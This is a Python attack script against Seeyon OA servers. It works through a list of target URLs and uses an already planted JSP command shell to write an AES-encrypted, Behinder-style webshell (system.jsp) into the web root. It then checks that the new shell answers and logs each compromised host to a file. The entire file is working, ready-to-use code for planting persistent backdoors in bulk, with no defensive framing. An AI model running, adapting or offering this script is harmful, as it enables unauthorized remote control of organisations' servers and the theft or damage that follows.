import requests
import os,time

'''
Code By yzddMr6
'''


headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36"
}

cmdshell='/seeyon/test123456.jsp?pwd=aaa&cmd='#改成你自己的地址跟密码
url_payload='cmd%20/c+echo+%5e%3c%25%40page+import%3d%22java.util.*%2cjavax.crypto.*%2cjavax.crypto.spec.*%22%25%5e%3e%5e%3c%25!class+U+extends+ClassLoader%7bU(ClassLoader+c)%7bsuper(c)%3b%7dpublic+Class+g(byte+%5b%5db)%7breturn+super.defineClass(b%2c0%2cb.length)%3b%7d%7d%25%5e%3e%5e%3c%25if(request.getParameter(%22dnxs%22)!%3dnull)%7bString+k%3d(%22%22%2bUUID.randomUUID()).replace(%22-%22%2c%22%22).substring(16)%3bsession.putValue(%22u%22%2ck)%3bout.print(k)%3breturn%3b%7dCipher+c%3dCipher.getInstance(%22AES%22)%3bc.init(2%2cnew+SecretKeySpec((session.getValue(%22u%22)%2b%22%22).getBytes()%2c%22AES%22))%3bnew+U(this.getClass().getClassLoader()).g(c.doFinal(new+sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext)%3b%25%5e%3e+%3e+..%5cwebapps%5cseeyon%5csystem.jsp'
bxshell='/seeyon/system.jsp'

def cmd2bx(url):
    requests.get(url=url+cmdshell+url_payload,headers=headers,timeout=10)
    url1=url+bxshell
    res=requests.get(url=url1,headers=headers)
    if res.status_code==200 or res.status_code==500:
        with open('savebx.txt','a') as save:
            save.write('BXSHELL [+] '+url1+'\n')
        print('BXSHELL [+] '+url1)
        return 1
    else:
        print('BXSHELL [-] '+url1)
        return 0 


if __name__=='__main__':
    start_time = time.time()
    urllist = []
    url_file_name = input('file or url :')
    try:
        if '://' in url_file_name:
            cmd2bx(url_file_name.strip())
        else:
            if os.path.exists(url_file_name):
                print(url_file_name, 'exists!')
                with open(url_file_name, 'r') as url_file:
                    for url in url_file.readlines():
                        url = url.strip()
                        urllist.append(url)
                    for u in urllist:
                        result=cmd2bx(u)
                        print("scanned down with %.2f\n" % float(time.time() - start_time))
            else:
                print(url_file_name + " not exist!")
                exit(0)
    except Exception as e:
        print(start_time, e)
